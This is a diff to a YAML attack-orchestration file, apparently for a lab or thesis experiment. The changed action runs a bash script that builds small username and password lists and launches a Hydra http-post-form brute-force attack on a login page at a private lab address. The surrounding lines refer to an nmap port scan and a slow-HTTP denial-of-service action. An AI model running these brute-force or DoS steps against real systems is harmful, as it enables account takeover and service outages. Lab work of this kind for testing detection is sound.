@@ -30,16 +30,22 @@ actions:
       ports: "1-1024"
       output: "~/exp_nmap/scan"
 
-  - name: hydra_brute
-    params:
-      service: "http-post-form"
-      port: 80
-      # O 'path' deve incluir os campos do módulo do Hydra (formato: /Rota:params:falha)
-      # Ajuste para a sua aplicação alvo no laboratório.
-      path: "/login:username=^USER^&password=^PASS^:F=Invalid"
-      user: "~/users.txt"
-      pass_list: "~/passwords.txt"
-      output: "~/exp_brute/hydra_http"
+  - name: Brute force HTTP (Hydra http-post-form)
+    host: attacker
+    shell: bash
+    cmd: |
+      set -euo pipefail
+      IP="192.168.56.12"  # ajuste aqui se necessário
+      mkdir -p ~/exp_brute
+      test -f ~/users.txt     || printf "admin\nuser\ntest\ntcc\n" > ~/users.txt
+      test -f ~/passwords.txt || printf "123456\npassword\nwrongpass\ntcc2025\n" > ~/passwords.txt
+      command -v hydra >/dev/null 2>&1 || { [ -x /usr/bin/hydra ] && sudo ln -sf /usr/bin/hydra /usr/local/bin/hydra || true; }
+
+      python3 -c 'import random,time; time.sleep(random.randint(60,180)/1000.0)'
+
+      hydra -L ~/users.txt -P ~/passwords.txt -s 80 -t 2 -f -I \
+        "$IP" http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" \
+        -o ~/exp_brute/hydra_http
 
   - name: slowhttp_dos
     params:
